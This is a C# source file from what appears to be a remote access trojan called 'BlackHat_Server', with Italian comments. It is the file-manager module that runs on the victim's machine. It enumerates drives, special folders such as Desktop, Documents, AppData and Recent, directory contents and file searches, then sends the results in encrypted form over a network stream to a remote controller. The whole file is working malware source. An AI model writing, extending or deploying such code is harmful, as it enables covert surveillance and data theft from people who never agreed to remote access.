using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using BlackHat_Server.Class;
using BlackHat_Server.Class.Comunicator;

namespace BlackHat_Server.Muduli.File_Manager
{
    internal class ListFiles
    {
        private readonly string fileListDir;

        private readonly NetworkStream myNetStream;

        /// <summary>
        ///     Ctor solo stream [Devices]
        /// </summary>
        /// <param name="ctor_NetStream"></param>
        public ListFiles(NetworkStream ctor_NetStream)
        {
            myNetStream = ctor_NetStream;
        }
        //------------------------------------------------------------


        /// <summary>
        ///     Ctor stream e dir [filelist]
        /// </summary>
        /// <param name="ctor_NetStream"></param>
        public ListFiles(NetworkStream ctor_NetStream, string ctor_Dir)
        {
            myNetStream = ctor_NetStream;
            fileListDir = ctor_Dir;
        }
        //------------------------------------------------------------


        /// <summary>
        ///     Thread Di List Devices
        /// </summary>
        public void StartListDevices()
        {
            var t = new Thread(ListDevices);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------


        /// <summary>
        ///     Prende Lista Drive e La trasmette
        /// </summary>
        private void ListDevices()
        {
            var drives = DriveInfo.GetDrives();
            var message = "";

            foreach (var drive in drives)
            {
                var volumeInfo = string.Format("{0} [{1}]|", drive.Name, drive.DriveType);
                message += volumeInfo;
            }

            var mm = new MsgManager(myNetStream);
            message = message.TrimEnd('|');
            var sent = mm.SendLargeEncryMessage(message, 10000);
        }
        //-----------------------------------


        /// <summary>
        ///     Avvio Thread di invio Cartelle Speciali
        /// </summary>
        public void StartListSpecial()
        {
            var t = new Thread(ListSpecial);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     Invio Cartelle Speciali
        /// </summary>
        private void ListSpecial()
        {
            var desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var doc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var pic = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            var progFile = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);

            var message = string.Format("{0}|{1}|{2}|{3}|{4}|{5}", desk, doc, pic, progFile, appData, recent);

            var mm = new MsgManager(myNetStream);
            var sent = mm.SendLargeEncryMessage(message, 10000);
        }
        //------------------------------------


        /// <summary>
        ///     Lista File in Dir
        /// </summary>
        public void StartListFile()
        {
            var t = new Thread(ListFilesInDir);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------

        /// <summary>
        ///     Prende Lista DEI FILE IN DESKTOP E LI TRASMETTE
        /// </summary>
        private void ListFilesInDir()
        {
            try
            {
                var message = "";
                // DIR
                var dirInDir = Directory.GetDirectories(fileListDir);

                foreach (var dir in dirInDir)
                {
                    var dirArr = dir.Split('\\');
                    var dirN = dirArr[dirArr.Length - 1];
                    var dirInfo = string.Format("{0}|-1*", dirN);
                    message += dirInfo;
                }

                // FILES
                var filesInDir = Directory.GetFiles(fileListDir);

                foreach (var file in filesInDir)
                {
                    var fi = new FileInfo(file);
                    var fileName = Path.GetFileName(file);


                    var volumeInfo = string.Format("{0}|{1}*", fileName, fi.Length);
                    message += volumeInfo;
                }
                //-----------------------------------------

                var mm = new MsgManager(myNetStream);
                message = message.TrimEnd('*');
                var sent = mm.SendLargeEncryMessage(message, 10000);
            }
            catch (IOException) // DISPOSITIVO NON PRONTO
            {
                // METTERE RISPOSTA IN CASO DI DISPOSITIVO NON PRONTO
                var notExist = "__ERROR__|NOTEXIST";

                var mm = new MsgManager(myNetStream);
                var sent = mm.SendLargeEncryMessage(notExist, 10000);
            }
            catch (UnauthorizedAccessException) // NON HO I DIRITTI PER ACCEDERE A QUESTA CARTELLA
            {
                // METTERE RISPOSTA IN CASO insufficienti diritti
                var notExist = "__ERROR__|NOTAUTH";

                var mm = new MsgManager(myNetStream);
                var sent = mm.SendLargeEncryMessage(notExist, 10000);
            }
        }
        //-----------------------------------


        /// <summary>
        ///     Lista File in Dir
        /// </summary>
        public void StrtListSearch()
        {
            var t = new Thread(SearchFiles);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------

        /// <summary>
        ///     Search File in Dir
        /// </summary>
        private void SearchFiles()
        {
            try
            {
                var mm = new MsgManager(myNetStream);
                //isGalleryWorking = true;


                var fmRequest = mm.WaitForEncryMessageRicorsive(10000); // aspetto la richiesta

                if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                {
                    var msgSplitted = fmRequest.Split('|');

                    if (msgSplitted[0] == "SEARCHDIR")
                    {
                        //string message = "";
                        var sr = new Search(myNetStream);
                        var listaFiles = new List<string>();

                        // SE è RICORSIVA
                        if (bool.Parse(msgSplitted[3]))
                        {
                            sr.NormalSearch(msgSplitted[1], msgSplitted[2]);
                            sr.RecursiveSearch(msgSplitted[1], msgSplitted[2]);
                            sr.SendStop();
                        }
                        else
                        {
                            sr.NormalSearch(msgSplitted[1], msgSplitted[2]);
                            sr.SendStop();
                        }
                    }
                }


                //  USCITO DA LOOP IL THREAD MUORE
                myNetStream.Close();


                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myNetStream))
                    ST_Client.Instance.nsListaCanali.Remove(myNetStream);
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                //isGalleryWorking = false;
            }
        }
    }
}